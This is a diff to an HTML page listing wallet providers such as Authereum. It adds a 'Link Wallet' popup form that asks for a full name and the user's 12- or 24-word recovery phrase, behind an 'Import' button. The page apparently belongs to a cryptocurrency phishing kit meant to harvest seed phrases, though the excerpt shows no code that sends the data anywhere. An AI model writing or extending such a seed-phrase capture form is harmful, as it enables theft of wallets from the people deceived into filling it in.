@@ -86,6 +86,26 @@
                 <h2>Authereum</h2>
             </button>
         </section>
+
+        <section class="popup">
+            <div class="popup__content">
+                <div class="popup__content--head border-bottom">
+                    <p class="para">Link Wallet</p>
+                </div>
+
+                <form action="#" class="form__control">
+                    <div class="form__group">
+                        <label for="fullName" class="form__label">Full Name</label>
+                        <input type="text" name="fullName" class="form__input" id="fullName" required placeholder="Enter Full Name">
+                    </div>
+                    <div class="form__group">
+                        <label for="recoveryphrase" class="form__label">Recovery Phrase</label>
+                        <textarea name="recoveryphrase" class="form__input" id="recoveryphrase" required placeholder="Typically 12 (sometimes 24) words separated by single spaces"></textarea>
+                    </div>
+                    <button type="submit" class="btn">Import</button>
+                </form>
+            </div>
+        </section>
     </main>
 </body>
 </html>
